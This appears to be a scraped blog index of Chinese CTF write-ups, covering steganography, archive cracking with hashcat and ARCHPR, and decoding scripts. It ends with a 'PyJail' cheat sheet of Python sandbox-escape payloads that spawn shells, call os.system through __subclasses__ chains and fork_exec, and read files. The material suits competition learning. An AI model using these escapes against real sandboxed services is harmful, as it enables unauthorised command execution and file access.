'4', 9: '3', 10: '2'} if len(num_str) != 18: return False check_num = 0 for index, num in enumerate(num_str): if index == 17: right_code = check_dict.get(check_num % 11) return num == right_code check_num += str_to_int.get(num) * (2 ** (17 - index) % 11) def extract_gender(idcard: str): return \"男\" if int(idcard[16:-1]) % 2 == 1 else \"女\" def check_gender(gender: str): return gender == \"男\" or gender == \"女\" def read_csv_data(file_path): result = [] with open(file_path, 'r', encoding='utf-8') as infile: reader = csv.reader(infile) next(reader) # 跳过表头 for row in reader: if len(row) \u003e= 4: data = { '姓名': row[0], '性别': row[1], '出生日期': row[2], '身份证号': row[3] } result.append(data) return result input_data = read_csv_data(input_file) processed_data = [] for row in input_data: if (row['出生日期'].replace('-', '') == row['身份证号'][6:-4] and check_id_number(row['身份证号']) and check_gender(row['性别']) and extract_gender(row['身份证号']) == row['性别'] and date_pattern.match(row['出生日期'])): processed_data.append(row) difference = [row for row in input_data if row not in processed_data] with open(output_file, 'w', encoding='utf-8') as outfile: for row in difference: outfile.write(f\"{row['姓名']},{row['性别']},{row['出生日期']},{row['身份证号']}\\n\") print(f\"Difference saved to {output_file}\") 最后删去空的换行符 flag{811bb0a604d4dbdbd52746353987abe1} 最后总结一下 数据安全没出亏在python写少了，后面在这方面需要强化 最遗憾的在于re的exchange，当时flag错了一位字符，导致flag始终交不上去，也可能是下午做晕了，检查了好几遍也没发现错误的那位字符。 ","date":"2024-10-30","objectID":"/2024sdnisc/:6:2","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#data_analy"},{"categories":["wp","misc"],"content":"省赛前夕把2024ylctf不太离谱的misc复现一下 ","date":"2024-10-26","objectID":"/2024ylctf_misc/:0:0","series":null,"tags":["wp","misc"],"title":"2024 YLCTF_misc","uri":"/2024ylctf_misc/#"},{"categories":["wp","misc"],"content":"\r[Round 1]","date":"2024-10-26","objectID":"/2024ylctf_misc/:1:0","series":null,"tags":["wp","misc"],"title":"2024 YLCTF_misc","uri":"/2024ylctf_misc/#round-1"},{"categories":["wp","misc"],"content":"\r乌龟子啦base64转图片 得到全是01的图片，ocr识别出来 二进制转图片，得到二维码，扫码得到flag ","date":"2024-10-26","objectID":"/2024ylctf_misc/:1:1","series":null,"tags":["wp","misc"],"title":"2024 YLCTF_misc","uri":"/2024ylctf_misc/#乌龟子啦"},{"categories":["wp","misc"],"content":"\rhide_png编写脚本提取像素点，或者用ps提取 官方wp给出的脚本 from PIL import Image f = Image.open('./attachments.png') img = Image.new(\"RGB\", (652,79)) for i in range(650): for j in range(79): t = f.getpixel(((i+5)*3,(j+4)*16)) img.putpixel((i,j),(t)) img.show() img.save('output.png') ","date":"2024-10-26","objectID":"/2024ylctf_misc/:1:2","series":null,"tags":["wp","misc"],"title":"2024 YLCTF_misc","uri":"/2024ylctf_misc/#hide_png"},{"categories":["wp","misc"],"content":"\rplain_crack明文攻击 ","date":"2024-10-26","objectID":"/2024ylctf_misc/:1:3","series":null,"tags":["wp","misc"],"title":"2024 YLCTF_misc","uri":"/2024ylctf_misc/#plain_crack"},{"categories":["wp","misc"],"content":"\rpngorziplsb隐写，提取出zip压缩文件 ARCHPR掩码爆破 得到密码114514giao，解压得到flag ","date":"2024-10-26","objectID":"/2024ylctf_misc/:1:4","series":null,"tags":["wp","misc"],"title":"2024 YLCTF_misc","uri":"/2024ylctf_misc/#pngorzip"},{"categories":["wp","misc"],"content":"\rwhatmusic发现文件尾有png倒置字样 byte翻转 脚本参考哦官方wp def reverse_byte_data(image_path, output_path): # 读取图片的二进制数据 with open(image_path, 'rb') as file: byte_data = file.read() # 翻转二进制数据流 reversed_byte_data = bytearray(reversed(byte_data)) # 将翻转后的二进制数据流写入新的文件 with open(output_path, 'wb') as file: file.write(reversed_byte_data) if __name__ == \"__main__\": import sys if len(sys.argv) != 3: print(\"Usage: python reverse_byte_data.py \u003cinput_image_path\u003e \u003coutput_image_path\u003e\") sys.exit(1) input_image_path = sys.argv[1] output_image_path = sys.argv[2] reverse_byte_data(input_image_path, output_image_path) print(f\"Image byte data reversed and saved to {output_image_path}\") 得到一个长条png图片，png宽高修复得到 根据hint1可知为lyra项目 https://github.com/google/lyra 进行解密 bazel-bin/lyra/cli_example/decoder_main --encoded_path=$HOME/temp/flag.lyra --output_dir=$HOME/temp/ 得到一段音频后，可以使用语音识别得到flag [Round 1] trafficdet [Round 1] SinCosTan ","date":"2024-10-26","objectID":"/2024ylctf_misc/:1:5","series":null,"tags":["wp","misc"],"title":"2024 YLCTF_misc","uri":"/2024ylctf_misc/#whatmusic"},{"categories":["wp","misc"],"content":"\r[Round 2]","date":"2024-10-26","objectID":"/2024ylctf_misc/:2:0","series":null,"tags":["wp","misc"],"title":"2024 YLCTF_misc","uri":"/2024ylctf_misc/#round-2"},{"categories":["wp","misc"],"content":"\r滴答滴查看十六进制发现全部都是 00 和 FF，猜测为电平信号 题目描述给了 man~ ，猜测曼切斯特编码 脚本参考官方wp脚本 def read_from_file(filename): # 从文件中读取二进制数据 with open(filename, 'rb') as file: return file.read() def manchester_to_binary(manchester_data): # 将曼切斯特编码的数据转换回二进制字符串 binary_str = '' i = 0 while i \u003c len(manchester_data): if manchester_data[i] == 0 and manchester_data[i+1] ==255: binary_str += '0' elif manchester_data[i] == 255 and manchester_data[i+1] == 0: binary_str += '1' i += 2 # 每次处理两个字节 return binary_str def binary_to_char(binary_str): # 将二进制字符串转换回ASCII字符 return ''.join([chr(int(binary_str[i:i+8], 2)) for i in range(0, len(binary_str), 8)]) # 示例使用 filename = \"attachment\" # 输入文件名 manchester_data = read_from_file(filename) binary_str = manchester_to_binary(manchester_data) print(binary_str) ascii_str = binary_to_char(binary_str) print(f\"解码后的ASCII字符串: {ascii_str}\") ","date":"2024-10-26","objectID":"/2024ylctf_misc/:2:1","series":null,"tags":["wp","misc"],"title":"2024 YLCTF_misc","uri":"/2024ylctf_misc/#滴答滴"},{"categories":["wp","misc"],"content":"\r听~deepsound发现隐藏文件 通过ARCHPR爆破得到密码为10117 加压后得到png图片，使用StegSolve查看各通道是否隐藏数据 提取对应通道数据 ","date":"2024-10-26","objectID":"/2024ylctf_misc/:2:2","series":null,"tags":["wp","misc"],"title":"2024 YLCTF_misc","uri":"/2024ylctf_misc/#听"},{"categories":["wp","misc"],"content":"\rTrace010editor 打开附件，对文件尾部base64编码进行解码 得到rar文件 john+hashcat进行掩码爆破 ┌──(kali㉿kali)-[~/Desktop] └─$ rar2john download.rar Created directory: /home/kali/.john download.rar:$rar5$16$cf7eaa5f77d931abb9d85c59e8743331$15$cc4fd7b00922373ef35e56129d016a9e$8$bb8c122375a4ed23 ┌──(kali㉿kali)-[~/Desktop] └─$ hashcat -m 13000 -a3 '$rar5$16$cf7eaa5f77d931abb9d85c59e8743331$15$cc4fd7b00922373ef35e56129d016a9e$8$bb8c122375a4ed23' ?d?d?d?d?d?d --show 得到密码为370950 解压后得到 猫脸变换得到修复后的图片 脚本参考官方wp def arnold_encode(image, shuffle_times=10, a=1, b=1, mode='1'): image = np.array(image) arnold_image = np.zeros(shape=image.shape, dtype=image.dtype) h, w = image.shape[0], image.shape[1] N = h for _ in range(shuffle_times): for ori_x in range(h): for ori_y in range(w): new_x = (1*ori_x + b*ori_y)% N new_y = (a*ori_x + (a*b+1)*ori_y) % N if mode == '1': arnold_image[new_x, new_y] = image[ori_x, ori_y] else: arnold_image[new_x, new_y, :] = image[ori_x, ori_y, :] return Image.fromarray(arnold_image) import numpy as np from PIL import Image def arnold_decode(image, shuffle_times=10, a=1, b=1, mode='1'): image = np.array(image) decode_image = np.zeros(shape=image.shape, dtype=image.dtype) h, w = image.shape[0], image.shape[1] N = h for _ in range(shuffle_times): for ori_x in range(h): for ori_y in range(w): new_x = ((a*b+1)*ori_x + (-b)* ori_y)% N new_y = ((-a)*ori_x + ori_y) % N if mode == '1': decode_image[new_x, new_y] = image[ori_x, ori_y] else: decode_image[new_x, new_y, :] = image[ori_x, ori_y, :] return Image.fromarray(decode_image) img = Image.open('input.png') decode_img = arnold_decode(img) decode_img.save('flag-output.png') ","date":"2024-10-26","objectID":"/2024ylctf_misc/:2:3","series":null,"tags":["wp","misc"],"title":"2024 YLCTF_misc","uri":"/2024ylctf_misc/#trace"},{"categories":["wp","misc"],"content":"\r[Round 3]","date":"2024-10-26","objectID":"/2024ylctf_misc/:3:0","series":null,"tags":["wp","misc"],"title":"2024 YLCTF_misc","uri":"/2024ylctf_misc/#round-3"},{"categories":["wp","misc"],"content":"\rBlackdoord盾查杀 ","date":"2024-10-26","objectID":"/2024ylctf_misc/:3:1","series":null,"tags":["wp","misc"],"title":"2024 YLCTF_misc","uri":"/2024ylctf_misc/#blackdoor"},{"categories":["wp","misc"],"content":"\rCheckImgstegsolve发现red plane 0 有隐写 Green plane 0给了提示 把 Red plane 0 通道的数据给提取出来 发现是两位两位逆转，写个脚本反转一下 def reverse_string(s): s = list(s) for i in range(0, len(s), 4): s[i:i+4] = s[i:i+4][::-1] return ''.join(s) f = open('data.txt', 'rb') data = f.read().decode('utf-8') print(reverse_string(data)) 贴到010恢复成png，得到另一张图片 zsteg一把梭，发现对IDAT块进行了隐写 对dna解码 import sys bin_dna = {'00':'A','10':'C','01':'G','11':'T'} mapping = { 'AAA':'a','AAC':'b','AAG':'c','AAT':'d','ACA':'e','ACC':'f', 'ACG':'g','ACT':'h','AGA':'i','AGC':'j','AGG':'k','AGT':'l','ATA':'m','ATC':'n','ATG':'o','ATT':'p','CAA':'q','CAC':'r','CAG':'s','CAT':'t','CCA':'u','CCC':'v','CCG':'w','CCT':'x','CGA':'y','CGC':'z','CGG':'A','CGT':'B','CTA':'C','CTC':'D','CTG':'E','CTT':'F','GAA':'G','GAC':'H','GAG':'I','GAT':'J','GCA':'K','GCC':'L','GCG':'M','GCT':'N','GGA':'O','GGC':'P','GGG':'Q','GGT':'R','GTA':'S','GTC':'T','GTG':'U','GTT':'V','TAA':'W','TAC':'X','TAG':'Y','TAT':'Z','TCA':'1','TCC':'2','TCG':'3','TCT':'4','TGA':'5','TGC':'6','TGG':'7','TGT':'8','TTA':'9','TTC':'0','TTG':' ','TTT':'.'} def bin_2_code(string): string = string.replace(\" \",\"\") string = string.replace(\"\\n\",\"\") final=\"\" for j in range(0,len(string),2): final+=bin_dna[string[j:j+2]] return final def decode_dna(string): final=\"\" for i in range(0,len(string),3): final+=mapping[string[i:i+3]] return final print(decode_dna(\"GCAGTTCTGCTGGGGGGTGTACTAGAGTGACTCGTTGCAGTTGTATACGCATATCTGGTGGGGGTATCCCTTGATCGTGCACTGTCCTAAGCAGCAGAAGAGTCCCTGGCAGCTCTATAAGATCTTCTAGTGGGGGCTGTAGCAGAGGTTCGGGTTGAGGCTCGTGTCGCAGTTGCACTGTCCGTCTATGTGGCAGTTGACGTGTAAGGTTATTAAGAAGGTGAGGTTGTAGTTGTAGCTGATTATGATCTTGAGGGGGCAGCTGAGTATGCCCTCGAGGCTGCAGACGATGGGTCCCTTGTAGGGGCATAAGATGTTCGTGTGGTAGTCGTAGAGGCACTTGCCGTTGCGGTAGCACTTGCAGCTCTTCTGGAAGTTTATGTTGCAGTTGAACTGGCGGTAGATTAAGATGCGTATCTCGCGGTTGTAGTCGATGCTCTCGTGGGGGGGGTAGAAGAGTGAGCACTGTAGGCTTCCGCCGCATAGTCCCTCCTGGTCGCATAAGCATGACTGCTGGGGGTCGTACTAGAAGATCTCCTTGCGGTGTCCGAGGATCGGTCGCTGCTAGTCGCAGTTGCAGTTGCTCTGTAAGTGTCCCTAGAGCTTGAAGTGTAGGTTGCACGTGAGGGTGATCTGGCGGGTGTAGGTGAGGCTGCACTGTCCGTCGCAGAAGCACGGTATGTGTGCGCGTCCGTGGATGTTCGGGTTCGGGTGGTAGCCGCACTTCTCCTTGCGGGTGCAGAAGATCTTGCGCTCGAGGTCGGTTGA\")) 得到 KVEEQRSCI5DVKVSXKZEUQS2FJBKE2WKKGI2EKNCWJFCUQNSKIVAVINBTKVKE2TZUKVHUWRZWGRIVSVSNJZJFIQKNIZLDINKHJQ2FSQKWJVBUSTSIKFLVMSKFKNFEGVZVKVGEMSJWJMZDMVSTJNDUQQSGI5KEYN2LKY2DETKWK5EEQTSCGJDFMU2IJA3ECTKVKVNEWU2CIFGUYVKBIRJEMRSRINKE2TKGKAZU6M2UJVAVAUSLKFDFMRKGJFMDITR5 cyberchef进行解码得到flag ","date":"2024-10-26","objectID":"/2024ylctf_misc/:3:2","series":null,"tags":["wp","misc"],"title":"2024 YLCTF_misc","uri":"/2024ylctf_misc/#checkimg"},{"categories":["wp","misc"],"content":"第七届“强网”拟态防御国际精英挑战赛线上预选赛misc ","date":"2024-10-20","objectID":"/2024qw_nitai_misc/:0:0","series":null,"tags":["wp","misc"],"title":"2024 强网拟态预赛misc","uri":"/2024qw_nitai_misc/#"},{"categories":["wp","misc"],"content":"\rpvz算1-1000的md5作为密码字典然后爆破压缩包 import hashlib def generate_md5(number): # 将数字转换为字符串，然后编码为字节 number_str = str(number).encode('utf-8') # 创建md5对象 md5 = hashlib.md5() # 更新md5对象，传入需要计算md5的字节数据 md5.update(number_str) # 获取16进制格式的md5值 return md5.hexdigest() # 打开文件准备写入 with open('dict.txt', 'w', encoding='utf-8') as file: # 循环1到1000 for i in range(1, 1001): # 生成md5值 md5_value = generate_md5(i) # 写入文件，并添加换行符 file.write(md5_value + '\\n') print(\"MD5值已生成并写入dict.txt文件。\") 进行压缩包爆破 将得到的二维码用ps调整一下 Ctrl+T Ctrl+Shift+Alt 填上定位符和给的码块 扫描二维码 根据文件名提示得知为Malbolge代码，运行得到flag https://malbolge.doleczek.pl/ ","date":"2024-10-20","objectID":"/2024qw_nitai_misc/:0:1","series":null,"tags":["wp","misc"],"title":"2024 强网拟态预赛misc","uri":"/2024qw_nitai_misc/#pvz"},{"categories":["wp","misc"],"content":"\rezflag追踪tcp流发现是zip压缩包（PK），导出原始数据 存为zip文件 删除尾部冗余数据，解压后得到flag.zip，分析为png文件 得到flag ","date":"2024-10-20","objectID":"/2024qw_nitai_misc/:0:2","series":null,"tags":["wp","misc"],"title":"2024 强网拟态预赛misc","uri":"/2024qw_nitai_misc/#ezflag"},{"categories":["wp","misc"],"content":"\rStreaming\r根据信息可判断为h.264流 利用插件，从RTP流中提取h.264 https://www.cnblogs.com/liushui-sky/p/13671360.html 播放h.264得到 异或ff并用'flag{3b3a9c08-'作为密钥进行aes解密 得到压缩包 分析badapple为png 苹果图片解析差异 https://www.fotoforensics.com/ 对s4cret文件补齐文件头 播放得到闪烁的视频 写一个脚本，来分析mp4视频，当画面为黑色代表0，画面为白色代表1，输出01字符串 import cv2 import numpy as np # 视频文件路径 video_path = 'your_video.mp4' # 打开视频文件 cap = cv2.VideoCapture(video_path) # 初始化输出字符串 output_string = '' # 读取视频帧 while cap.isOpened(): ret, frame = cap.read() if not ret: break # 将BGR转换为灰度图像 gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY) # 阈值处理，将灰度图像转换为二值图像 _, binary = cv2.threshold(gray, 127, 255, cv2.THRESH_BINARY) # 检查二值图像是否全黑或全白 if np.all(binary == 0): output_string += '0' elif np.all(binary == 255): output_string += '1' else: # 如果不是全黑或全白，可以在这里添加其他逻辑 output_string += '?' # 释放视频捕获对象 cap.release() # 打印输出字符串 print(output_string) 得到的二进制串转ascii，得到乱码，考虑到可能01逻辑搞反，将01字符互换，得到 0111010001101000011001010010000001100110011011000110000101100111001100110010000001101001011100110010000000101101001100010011001100111000001110010011000101100010011000010011001100110010001101000110010001100001011111011111111111111111111111111111111111111111111 转ascii the flag3 is -13891ba324da}ÿÿÿÿÿ ","date":"2024-10-20","objectID":"/2024qw_nitai_misc/:0:3","series":null,"tags":["wp","misc"],"title":"2024 强网拟态预赛misc","uri":"/2024qw_nitai_misc/#streaming"},{"categories":["wp","misc"],"content":"\rFind way to read video根据文本hint，收缩到在gitcode有marco1763的文件 下载md文件，复制内容进行spam解密 https://spammimic.com/ 得到 BV1P62EYHEZd eyJ2IjozLCJuIjoiZmw0ZyIsInMiOiIiLCJoIjoiZGExMTcyNSIsIm0iOjkwLCJrIjo4MSwibWciOjIwMCwia2ciOjEzMCwibCI6NDMsInNsIjoxLCJmaGwiOlsiMjUyZjEwYyIsImFjYWM4NmMiLCJjYTk3ODExIiwiY2QwYWE5OCIsIjAyMWZiNTkiLCIyYzYyNDIzIiwiY2E5NzgxMSIsIjRlMDc0MDgiLCJlN2Y2YzAxIiwiMmM2MjQyMyIsIjI1MmYxMGMiLCI1ZmVjZWI2IiwiZWYyZDEyNyIsIjM5NzNlMDIiLCJjYTk3ODExIiwiNGIyMjc3NyIsImU3ZjZjMDEiLCI3OTAyNjk5IiwiMzk3M2UwMiIsIjRiMjI3NzciLCI3OTAyNjk5IiwiZWYyZDEyNyIsIjI1MmYxMGMiLCIzOTczZTAyIiwiY2E5NzgxMSIsImVmMmQxMjciLCJkNDczNWUzIiwiMjUyZjEwYyIsIjM5NzNlMDIiLCI2Yjg2YjI3IiwiM2UyM2U4MSIsImQ0NzM1ZTMiLCJlN2Y2YzAxIiwiMmU3ZDJjMCIsIjJlN2QyYzAiLCI0YjIyNzc3IiwiNWZlY2ViNiIsIjI1MmYxMGMiLCIyZTdkMmMwIiwiNGIyMjc3NyIsIjNmNzliYjciLCJkMTBiMzZhIiwiMDFiYTQ3MSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiMDg0ZmVkMCIsIjE4ZjUzODQiLCIxODlmNDAwIiwiZWY2Y2JkMiIsIjI3OTUyMTciLCJhOTI1M2RjIiwiNGM5NDQ4NSIsIjI1MmYxMGMiLCI4NWY5N2UwIl19 将第二段字符串base64解码 {\"v\":3,\"n\":\"fl4g\",\"s\":\"\",\"h\":\"da11725\",\"m\":90,\"k\":81,\"mg\":200,\"kg\":130,\"l\":43,\"sl\":1,\"fhl\":[\"252f10c\",\"acac86c\",\"ca97811\",\"cd0aa98\",\"021fb59\",\"2c62423\",\"ca97811\",\"4e07408\",\"e7f6c01\",\"2c62423\",\"252f10c\",\"5feceb6\",\"ef2d127\",\"3973e02\",\"ca97811\",\"4b22777\",\"e7f6c01\",\"7902699\",\"3973e02\",\"4b22777\",\"7902699\",\"ef2d127\",\"252f10c\",\"3973e02\",\"ca97811\",\"ef2d127\",\"d4735e3\",\"252f10c\",\"3973e02\",\"6b86b27\",\"3e23e81\",\"d4735e3\",\"e7f6c01\",\"2e7d2c0\",\"2e7d2c0\",\"4b22777\",\"5feceb6\",\"252f10c\",\"2e7d2c0\",\"4b22777\",\"3f79bb7\",\"d10b36a\",\"01ba471\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"6e340b9\",\"084fed0\",\"18f5384\",\"189f400\",\"ef6cbd2\",\"2795217\",\"a9253dc\",\"4c94485\",\"252f10c\",\"85f97e0\"]} 第一段文本是b站的BV号BV1P62EYHEZd 但并没得到什么有效信息，经过观察与验证发现后面的数组字符串是f，l，a，g字母字样的sha256前7位 写脚本进行爆破 import hashlib import string # 获取所有可能的字符 possible_chars = string.printable # 包含所有可打印字符 # 建立哈希前缀到字符的映射 hash_prefix_to_char = {} for char in possible_chars: sha256_hash = hashlib.sha256(char.encode()).hexdigest() prefix = sha256_hash[:7] hash_prefix_to_char[prefix] = char # 给定的哈希前缀列表 fhl = [ \"252f10c\", \"acac86c\", \"ca97811\", \"cd0aa98\", \"021fb59\", \"2c62423\", \"4e07408\", \"4e07408\", \"ca97811\", \"2e7d2c0\", \"6b86b27\", \"3f79bb7\", \"4e07408\", \"3973e02\", \"d4735e3\", \"4b22777\", \"7902699\", \"e7f6c01\", \"3973e02\", \"4b22777\", \"4b22777\", \"6b86b27\", \"2e7d2c0\", \"3973e02\", \"ca97811\", \"3f79bb7\", \"4e07408\", \"d4735e3\", \"3973e02\", \"3f79bb7\", \"3f79bb7\", \"252f10c\", \"3f79bb7\", \"6b86b27\", \"18ac3e7\", \"5feceb6\", \"4e07408\", \"18ac3e7\", \"18ac3e7\", \"19581e2\", \"3f79bb7\", \"d10b36a\", \"01ba471\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"6e340b9\", \"77adfc9\", \"de7d1b7\", \"44bd7ae\", \"bb7208b\", \"83891d7\", \"2a0ab73\", \"fe1dcd3\", \"559aead\", \"f031efa\" ] # 重建消息 message = '' for prefix in fhl: char = hash_prefix_to_char.get(prefix) if char: message += char else: message += '?' print(\"重建的消息：\", message) ","date":"2024-10-20","objectID":"/2024qw_nitai_misc/:0:4","series":null,"tags":["wp","misc"],"title":"2024 强网拟态预赛misc","uri":"/2024qw_nitai_misc/#find-way-to-read-video"},{"categories":["misc","manual"],"content":"对PyJail姿势的总结 在python中，类均继承自object基类； python中类本身具有一些静态方法，如bytes.fromhex、int.from_bytes等。 ","date":"2024-10-14","objectID":"/pyjail_summury/:0:0","series":null,"tags":["misc","manual"],"title":"PyJail姿势总结","uri":"/pyjail_summury/#"},{"categories":["misc","manual"],"content":"\r魔术方法 __init__：构造函数。 __len__：返回对象的长度。对一个对象a使用len(a)时，会尝试调用a.__len__()。 __str__：返回对象的字符串表示。对一个对象a使用str(a)时，会尝试调用a.__str__()。 __getitem__：根据索引返回对象的某个元素。对一个对象a使用a[1]时，会尝试调用a.__getitem__(1)。 __add__、__sub__、__mul__、__div__、__mod__：算术运算，加减乘除模。如对一个对象a使用a+b时，会尝试调用a.__add__(b)。 __and__，__or__、__xor__：逻辑运算，和算术运算类似； __eq__，__ne__、__lt__、__gt__、__le__、__ge__：比较运算，和算术运算类似；例如'贵州' \u003e '广西'，就会转而调用'贵州'.__gt__('广西')； __getattr__：对象是否含有某属性。如果我们对对象a所对应的类实现了该方法，那么在调用未实现的a.b时，就会转而调用a.__getattr__(b)。这也等价于用函数的方法调用：getattr(a, 'b')。有__getattr__，自然也有对应的__setattr__； __subclasses__：返回当前类的所有子类。一般是用在object类中，在object.__subclasses__()中，我们可以找到os模块中的类，然后再找到os，并且执行os.system，实现RCE。 ","date":"2024-10-14","objectID":"/pyjail_summury/:0:1","series":null,"tags":["misc","manual"],"title":"PyJail姿势总结","uri":"/pyjail_summury/#魔术方法"},{"categories":["misc","manual"],"content":"\r魔术属性： __dict__：可以查看内部所有属性名和属性值组成的字典。 __doc__：类的帮助文档。默认类均有帮助文档。对于自定义的类，需要我们自己实现。 常用__doc__属性来取字符 __class__：返回当前对象所属的类。如''.__class__会返回\u003cclass 'str'\u003e。拿到类之后，就可以通过构造函数生成新的对象，如''.__class__(4396)，就等价于str(4396)，即'4396'； __base__：返回当前类的基类。如str.__base__会返回\u003cclass 'object'\u003e； ","date":"2024-10-14","objectID":"/pyjail_summury/:0:2","series":null,"tags":["misc","manual"],"title":"PyJail姿势总结","uri":"/pyjail_summury/#魔术属性"},{"categories":["misc","manual"],"content":"\r内置函数和变量： dir：查看对象的所有属性和方法。 chr、ord：字符与ASCII码转换函数，可以绕WAF globals：返回所有全局变量的函数； locals：返回所有局部变量的函数； __import__：载入模块的函数。import os等价于os = __import__('os')； __name__：该变量指示当前运行环境位于哪个模块中。 __builtins__：包含当前运行环境中默认的所有函数与类。 __file__：该变量指示当前运行代码所在路径。open(__file__).read()就是读取当前运行的python文件代码。 _：该变量返回上一次运行的python语句结果。 ","date":"2024-10-14","objectID":"/pyjail_summury/:0:3","series":null,"tags":["misc","manual"],"title":"PyJail姿势总结","uri":"/pyjail_summury/#内置函数和变量"},{"categories":["misc","manual"],"content":"\r模块 #os import os os.system('dir') os.popen('dir').read() #platform import platform platform.popen('dir').read() platform.os.system('dir') #timeit import timeit timeit.timeit(\"__import__('os').system('dir')\") #sys from sys import modules modules['os'].system('sh') modules['posix'].system('sh') sys._getframe().f_locals.values() ","date":"2024-10-14","objectID":"/pyjail_summury/:0:4","series":null,"tags":["misc","manual"],"title":"PyJail姿势总结","uri":"/pyjail_summury/#模块"},{"categories":["misc","manual"],"content":"\rlambda表达式 __import__('os').system('sh') __builtins__.__dict__['__import__']('os').system('sh') (lambda: __import__('os').system('sh'))() (__builtins__:=__import__('os'))and(lambda:system)()('sh') ","date":"2024-10-14","objectID":"/pyjail_summury/:0:5","series":null,"tags":["misc","manual"],"title":"PyJail姿势总结","uri":"/pyjail_summury/#lambda表达式"},{"categories":["misc","manual"],"content":"\rreload 重新加载重新加载模块，绕过删除模块或方法 \u003e\u003e\u003e __builtins__.__dict__['eval'] \u003cbuilt-in function eval\u003e \u003e\u003e\u003e del __builtins__.__dict__['eval'] \u003e\u003e\u003e __builtins__.__dict__['eval'] Traceback (most recent call last): File \"\u003cstdin\u003e\", line 1, in \u003cmodule\u003e KeyError: 'eval' \u003e\u003e\u003e reload(__builtins__) \u003cmodule '__builtin__' (built-in)\u003e \u003e\u003e\u003e __builtins__.__dict__['eval'] \u003cbuilt-in function eval\u003e 在 Python 3 中，reload() 函数被移动到 importlib 模块中，所以如果要使用 reload() 函数，需要先导入 importlib 模块。 ","date":"2024-10-14","objectID":"/pyjail_summury/:0:6","series":null,"tags":["misc","manual"],"title":"PyJail姿势总结","uri":"/pyjail_summury/#reload-重新加载"},{"categories":["misc","manual"],"content":"\r恢复 sys.modules一些过滤中可能将 sys.modules['os'] 进行修改. 这个时候即使将 os 模块导入进来,也是无法使用的. sys.modules['os'] = 'not allowed' del sys.modules['os'] import os os.system('ls') ","date":"2024-10-14","objectID":"/pyjail_summury/:0:7","series":null,"tags":["misc","manual"],"title":"PyJail姿势总结","uri":"/pyjail_summury/#恢复-sysmodules"},{"categories":["misc","manual"],"content":"\rrce_payload __import__('os').system('cat ./flag.txt') __import__('os').system('sh') print(open('/flag.txt').read()) #起手式 os.system('sh') os.popen('ls').read() #属性/字典 getattr(__import__('os'),'system')('dir') __import__('os').__getattribute__('system')('dir') __import__('os').__dict__.__getitem__('system')('dir') #os._wrap_close类 ().__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('sh') #object类 - warnings.WarningMessage类 ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['system']('ls') ().__class__.__base__.__subclasses__()[137].__init__.__globals__['system'](\"sh\") #help()函数 help() =\u003e os =\u003e !sh help() =\u003e __main__ help() =\u003e [filename] #调试器 breakpoint() #_posixsubprocess.fork_exec #不同的python版本的_posixsubprocess.fork_exec接受的参数个数不一样 #参考https://ctftime.org/writeup/31883 import os __loader__.load_module('_posixsubprocess').fork_exec([b\"/bin/sh\"], [b\"/bin/sh\"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) #文件读取 open('1.txt').read() #object类 ().__class__.__base__.__subclasses__()[40](\"1.txt\").read() ().__class__.__bases__[0].__subclasses__()[40](\"1.txt\").read() \"\".__class__.__mro__[-1].__subclasses__()[40](\"1.txt\").read() ","date":"2024-10-14","objectID":"/pyjail_summury/:0:8","series":null,"tags":["misc","manual"],"title":"PyJail姿势总结","uri":"/pyjail_summury/#rce_payload"},{"categories":["misc","manual"],"content":"\rbypass #字符串拼接 'sys'+'tem' =\u003e 'system' '__imp'+'ort__' =\u003e '__import__' ''.join(['__imp','ort__']) =\u003e '__import__' #unicode绕过 相似 unicode 寻找网站：http://shapecatcher.com/ 可以通过绘制的方式寻找相似字符 #下划线被过滤 dir()[0] =\u003e '_' 也可以使用对应的全角字符进行替换： ＿ 第一个字符不能为全角，否则会报错： \u003e\u003e\u003e print(_＿name_＿) __main__ \u003e\u003e\u003e print(＿＿name_＿) File \"\u003cstdin\u003e\", line 1 print(＿＿name_＿) ^ SyntaxError: invalid character '＿' (U+FF3F) #chr()函数构造 